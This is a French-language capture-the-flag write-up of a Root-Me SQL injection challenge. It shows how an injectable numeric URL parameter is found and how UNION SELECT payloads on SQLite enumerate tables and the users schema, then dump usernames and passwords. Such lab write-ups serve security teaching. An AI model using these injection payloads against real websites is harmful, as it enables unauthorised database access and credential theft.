# Writeup -- SQL Injection - Numérique

## Catégorie

Web - Server

## Énoncé

Retrouvez le mot de passe de l’administrateur.

## Choses à savoir 

On peut injecter du sql autre part que dans un input de texte du genre login.
Ici, il fallait analyser les liens et surtout les paramètres dans les liens des pages

## Exploitation

On cherche le mot de passe de l'admin.

On remarque que lorsqu'on clique sur les différentes pages, un paramètre est modifié dans le lien :
```
http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1
```
ici c'est le paramètre : `news_id=1`

Pour vérifier que l'injection se fait bien ici, on peut tester des paramètres : 

Avec `1 OR 1=1` :

<img width="410" height="259" alt="image" src="https://github.com/user-attachments/assets/90c608f2-7214-494f-90b1-e5bef74437dc" />

On remarque que toutes les pages sont afichées d'un seul coup, l'injection se fait ici !

On va maintenant chercher combien de colonnes demandent la BDD :
```
news_id=1 UNION SELECT 1,2,3
```
Ce paramètre retourne une page sans erreur :

<img width="518" height="244" alt="image" src="https://github.com/user-attachments/assets/1b4e7610-eab4-4004-88e6-8515976dfd78" />

Maintenant que nous connaissons le nombre de colonnes, on va afficher les tables de la BDD :
```
news_id=1 UNION SELECT 1,name,3 FROM sqlite_master
```

<img width="413" height="266" alt="image" src="https://github.com/user-attachments/assets/68563107-2044-4448-b8b8-0165d70843f2" />

Deux tables existent : `news` et `users`

On veut afficher le mot de passe de l'administrateur. Pour cela, on va chercher comment la table users est créée :
```
news_id=1 UNION SELECT 1,sql,3 FROM sqlite_master LIMIT 1 OFFSET 1
```
<img width="498" height="189" alt="image" src="https://github.com/user-attachments/assets/bf0e36ae-ddd4-4c75-a9a5-4cc50c3f64fb" />

On voit les deux colonnes intéressantes : `username` et `password`

On peut donc terminer le challenge en affichant tous les users avec leurs mots de passe :
```
news_id=1 UNION SELECT 1,username,password FROM users
```
<img width="423" height="302" alt="flag" src="https://github.com/user-attachments/assets/a1a032d9-c41c-4fc2-a515-6b0dc2b20047" />

Le mot de passe, qui permet de valider le challenge, s'affiche.

